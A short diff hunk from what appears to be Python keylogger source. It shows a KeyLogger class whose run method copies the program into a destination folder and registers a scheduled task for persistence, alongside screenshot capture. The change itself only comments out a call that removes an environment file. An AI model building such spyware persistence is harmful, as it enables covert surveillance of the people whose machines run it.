@@ -217,7 +217,7 @@ class KeyLogger:
                 self.appendlog(f"\nError taking screenshot: {e}")
 
     def run(self):
-        remove_env_file()
+        # remove_env_file()
         executable_path = save_program_in_location(self.src_file, self.dest_folder)
         create_scheduled_task(executable_path, self.task_name)
 
